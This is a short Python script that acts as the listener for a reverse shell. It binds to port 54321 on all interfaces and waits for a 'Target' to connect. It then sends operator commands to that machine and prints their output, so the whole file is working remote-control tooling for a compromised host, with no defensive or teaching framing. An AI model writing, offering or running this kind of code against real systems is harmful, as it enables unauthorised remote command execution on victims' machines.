#!/usr/bin/python
import socket

def connection(s):
	print ("Listening for connection...")
	conn, addr = s.accept()
	print ("Target conected: %s")%addr[0]
	data=conn.recv(1024)
	op=data
	while True:
		cmd=raw_input(op+' ')
		if cmd == "exit":
			print ("Closing the connection...")
			conn.close()
			connection(s)
		cmd = ' ' if cmd == '' else cmd
		try:
			conn.send(cmd)
			op=conn.recv(100000)
		except:
			print ("Target got disconnected...")
			connection(s)

try:
	s=socket.socket()
	s.bind(("0.0.0.0",54321))
	s.listen(1)
	connection(s)
except KeyboardInterrupt:
	print ("Quitting...")
	s.close()
except:
	print ("Error while processing...")

